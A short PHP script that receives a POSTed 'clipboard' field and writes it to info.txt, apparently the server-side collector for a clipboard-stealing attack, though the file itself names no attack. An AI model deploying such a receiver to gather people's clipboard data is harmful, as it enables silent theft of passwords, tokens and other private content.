<?php
if (isset($_POST["clipboard"])){
    $file = fopen("info.txt", "w");
    fwrite($file, "ClipBoard Content: ".$_POST["clipboard"]);
    fclose($file);
}
exit();
?>